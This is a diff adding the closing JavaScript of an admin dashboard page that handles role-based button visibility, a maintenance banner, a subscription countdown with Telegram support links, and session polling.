+                    const dbViewerBtn = document.getElementById('db-viewer-btn');
+                    if (dbViewerBtn) dbViewerBtn.style.display = 'block';
+                    const manageAdminsBtn = document.getElementById('manage-admins-btn');
+                    if (manageAdminsBtn) manageAdminsBtn.style.display = 'block';
+                    const notificationsBtn = document.getElementById('notifications-btn');
+                    if (notificationsBtn) notificationsBtn.style.display = 'block';
+                    // Mobile buttons
+                    const dbViewerBtnMobile = document.getElementById('db-viewer-btn-mobile');
+                    if (dbViewerBtnMobile) dbViewerBtnMobile.style.display = 'block';
+                    const manageAdminsBtnMobile = document.getElementById('manage-admins-btn-mobile');
+                    if (manageAdminsBtnMobile) manageAdminsBtnMobile.style.display = 'block';
+                    const notificationsBtnMobile = document.getElementById('notifications-btn-mobile');
+                    if (notificationsBtnMobile) notificationsBtnMobile.style.display = 'block';
+                } else {
+                    // Hide config section, database viewer, manage admins, and notifications for normal admin
+                    const configSection = document.getElementById('config-section');
+                    if (configSection) configSection.style.display = 'none';
+                    const dbViewerBtn = document.getElementById('db-viewer-btn');
+                    if (dbViewerBtn) dbViewerBtn.style.display = 'none';
+                    const manageAdminsBtn = document.getElementById('manage-admins-btn');
+                    if (manageAdminsBtn) manageAdminsBtn.style.display = 'none';
+                    const notificationsBtn = document.getElementById('notifications-btn');
+                    if (notificationsBtn) notificationsBtn.style.display = 'none';
+                    // Mobile buttons
+                    const dbViewerBtnMobile = document.getElementById('db-viewer-btn-mobile');
+                    if (dbViewerBtnMobile) dbViewerBtnMobile.style.display = 'none';
+                    const manageAdminsBtnMobile = document.getElementById('manage-admins-btn-mobile');
+                    if (manageAdminsBtnMobile) manageAdminsBtnMobile.style.display = 'none';
+                    const notificationsBtnMobile = document.getElementById('notifications-btn-mobile');
+                    if (notificationsBtnMobile) notificationsBtnMobile.style.display = 'none';
+                }
+                
+                // Load maintenance message and subscription countdown for normal admins
+                if (userRole === 'admin') {
+                    loadMaintenanceMessage();
+                    loadSubscriptionCountdown();
+                }
+                
+                // Load config only for super admin
+                if (userRole === 'super_admin') {
+                    loadConfig();
+                }
+            } catch (error) {
+                console.error('Error loading user role:', error);
+            }
+        }
+        
+        // Load maintenance message
+        async function loadMaintenanceMessage() {
+            try {
+                const response = await fetch('/api/maintenance');
+                const data = await response.json();
+                
+                if (data.enabled && data.message) {
+                    const banner = document.getElementById('maintenance-banner');
+                    const messageText = document.getElementById('maintenance-message-text');
+                    if (banner && messageText) {
+                        messageText.textContent = data.message;
+                        banner.style.display = 'block';
+                    }
+                } else {
+                    const banner = document.getElementById('maintenance-banner');
+                    if (banner) banner.style.display = 'none';
+                }
+            } catch (error) {
+                console.error('Error loading maintenance message:', error);
+            }
+        }
+        
+        // Load subscription countdown
+        let countdownInterval = null;
+        async function loadSubscriptionCountdown() {
+            try {
+                const response = await fetch('/api/user/role');
+                const data = await response.json();
+                
+                const countdownDiv = document.getElementById('subscription-countdown');
+                const countdownText = document.getElementById('subscription-countdown-text');
+                const countdownTimer = document.getElementById('subscription-countdown-timer');
+                
+                if (!countdownDiv || !countdownText || !countdownTimer) return;
+                
+                if (data.subscription_expires) {
+                    const expiresDate = new Date(data.subscription_expires);
+                    const now = new Date();
+                    
+                    if (data.subscription_status === 'active' && expiresDate > now) {
+                        countdownDiv.style.display = 'block';
+                        countdownText.textContent = 'Your subscription is active';
+                        
+                        // Start countdown timer
+                        function updateCountdown() {
+                            const now = new Date();
+                            const diff = expiresDate - now;
+                            
+                            if (diff <= 0) {
+                                countdownTimer.textContent = 'Subscription has expired';
+                                countdownTimer.style.color = '#ef4444';
+                                if (countdownInterval) {
+                                    clearInterval(countdownInterval);
+                                    countdownInterval = null;
+                                }
+                                return;
+                            }
+                            
+                            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+                            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+                            
+                            if (days > 0) {
+                                countdownTimer.textContent = `Expires in: ${days} day${days > 1 ? 's' : ''}, ${hours} hour${hours > 1 ? 's' : ''}, ${minutes} minute${minutes > 1 ? 's' : ''}`;
+                            } else if (hours > 0) {
+                                countdownTimer.textContent = `Expires in: ${hours} hour${hours > 1 ? 's' : ''}, ${minutes} minute${minutes > 1 ? 's' : ''}, ${seconds} second${seconds > 1 ? 's' : ''}`;
+                            } else if (minutes > 0) {
+                                countdownTimer.textContent = `Expires in: ${minutes} minute${minutes > 1 ? 's' : ''}, ${seconds} second${seconds > 1 ? 's' : ''}`;
+                            } else {
+                                countdownTimer.textContent = `Expires in: ${seconds} second${seconds > 1 ? 's' : ''}`;
+                            }
+                            
+                            // Change color when less than 7 days remaining
+                            if (days < 7) {
+                                countdownTimer.style.color = '#fbbf24';
+                            } else {
+                                countdownTimer.style.color = 'rgba(255, 255, 255, 0.7)';
+                            }
+                        }
+                        
+                        updateCountdown();
+                        if (countdownInterval) clearInterval(countdownInterval);
+                        countdownInterval = setInterval(updateCountdown, 1000);
+                    } else if (data.subscription_status === 'suspended') {
+                        countdownDiv.style.display = 'block';
+                        countdownText.textContent = 'Your account has been suspended';
+                        countdownText.style.color = '#fbbf24';
+                        // Load support Telegram from config
+                        fetch('/api/config')
+                            .then(response => response.json())
+                            .then(config => {
+                                const supportTelegram = config.support_telegram;
+                                if (supportTelegram) {
+                                    const telegramUser = supportTelegram.replace('@', '');
+                                    countdownTimer.innerHTML = `Please contact support: <a href="https://t.me/${telegramUser}" target="_blank" style="color: #60a5fa; text-decoration: none;">@${telegramUser}</a>`;
+                                    // Add button
+                                    const buttonDiv = document.createElement('div');
+                                    buttonDiv.style.marginTop = '10px';
+                                    buttonDiv.innerHTML = `<a href="https://t.me/${telegramUser}" target="_blank" class="btn btn-primary" style="padding: 10px 20px; text-decoration: none; display: inline-block; background: rgba(120, 119, 198, 0.2); border: 1px solid rgba(120, 119, 198, 0.4); border-radius: 12px; color: white; font-weight: 600; transition: all 0.3s;">💬 Contact Support on Telegram</a>`;
+                                    countdownTimer.parentElement.appendChild(buttonDiv);
+                                } else {
+                                    countdownTimer.textContent = 'Please contact support for assistance';
+                                }
+                            })
+                            .catch(() => {
+                                countdownTimer.textContent = 'Please contact support for assistance';
+                            });
+                        countdownTimer.style.color = 'rgba(255, 255, 255, 0.7)';
+                    } else if (data.subscription_status === 'expired' || data.subscription_expired) {
+                        countdownDiv.style.display = 'block';
+                        countdownText.textContent = 'Your subscription has expired';
+                        countdownText.style.color = '#ef4444';
+                        // Load support Telegram from config
+                        fetch('/api/config')
+                            .then(response => response.json())
+                            .then(config => {
+                                const supportTelegram = config.support_telegram;
+                                if (supportTelegram) {
+                                    const telegramUser = supportTelegram.replace('@', '');
+                                    countdownTimer.innerHTML = `Please contact support for renewal: <a href="https://t.me/${telegramUser}" target="_blank" style="color: #60a5fa; text-decoration: none;">@${telegramUser}</a>`;
+                                    // Add button
+                                    const buttonDiv = document.createElement('div');
+                                    buttonDiv.style.marginTop = '10px';
+                                    buttonDiv.innerHTML = `<a href="https://t.me/${telegramUser}" target="_blank" class="btn btn-primary" style="padding: 10px 20px; text-decoration: none; display: inline-block; background: rgba(120, 119, 198, 0.2); border: 1px solid rgba(120, 119, 198, 0.4); border-radius: 12px; color: white; font-weight: 600; transition: all 0.3s;">💬 Contact Support on Telegram</a>`;
+                                    countdownTimer.parentElement.appendChild(buttonDiv);
+                                } else {
+                                    countdownTimer.textContent = 'Please contact support for renewal';
+                                }
+                            })
+                            .catch(() => {
+                                countdownTimer.textContent = 'Please contact support for renewal';
+                            });
+                        countdownTimer.style.color = 'rgba(255, 255, 255, 0.7)';
+                    } else {
+                        countdownDiv.style.display = 'none';
+                    }
+                } else {
+                    countdownDiv.style.display = 'none';
+                }
+            } catch (error) {
+                console.error('Error loading subscription countdown:', error);
+            }
+        }
+        
+        // Initialize
+        // Check for session parameter in URL and open modal
+        function checkUrlForSession() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const sessionId = urlParams.get('session');
+            if (sessionId) {
+                // Fetch session data and show modal
+                fetch(`/api/sessions`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.sessions) {
+                            const session = data.sessions.find(s => s.id == sessionId);
+                            if (session) {
+                                showSessionDetails(session);
+                                // Clean URL
+                                window.history.replaceState({}, document.title, window.location.pathname);
+                            }
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error loading session:', error);
+                    });
+            }
+        }
+        
+        loadUserRole().then(() => {
+            updateStatus();
+            loadSessions();
+            loadExtensionUrls(); // Load extension URLs
+            checkUrlForSession(); // Check for session in URL
+            setInterval(updateStatus, 5000);
+            setInterval(loadSessions, 10000);
+        });
+    </script>
+</body>
+</html>
